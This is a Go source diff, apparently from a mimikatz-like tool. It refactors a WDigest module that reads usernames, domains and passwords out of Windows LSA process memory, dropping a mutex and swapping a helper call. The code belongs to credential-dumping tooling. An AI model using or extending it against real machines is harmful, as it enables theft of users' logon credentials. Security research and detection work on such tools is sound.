@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"reflect"
 	"runtime"
-	"sync"
 	"time"
 	"unicode/utf16"
 	"unsafe"
@@ -21,8 +20,6 @@ type wdigest struct {
 
 	primaryOffset int
 	credAddress   uintptr
-
-	mu sync.Mutex
 }
 
 func newWdigest(ctx *Kiwi) *wdigest {
@@ -198,8 +195,6 @@ type Wdigest struct {
 }
 
 func (wdigest *wdigest) GetPassword(pHandle windows.Handle, logonID windows.LUID) (*Wdigest, error) {
-	wdigest.mu.Lock()
-	defer wdigest.mu.Unlock()
 	if wdigest.credAddress == 0 {
 		err := wdigest.searchAddresses(pHandle)
 		if err != nil {
@@ -251,14 +246,14 @@ func (wdigest *wdigest) GetPassword(pHandle windows.Handle, logonID windows.LUID
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read wdigest primary credential")
 	}
-	username, err := api.ReadLSAUnicodeString(pHandle, &cred.Username)
+	username, err := wdigest.ctx.readLSAUnicodeString(pHandle, &cred.Username)
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read wdigest credential username")
 	}
 	// if username == "" {
 	// 	return nil, nil
 	// }
-	domain, err := api.ReadLSAUnicodeString(pHandle, &cred.Domain)
+	domain, err := wdigest.ctx.readLSAUnicodeString(pHandle, &cred.Domain)
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read wdigest credential domain")
 	}
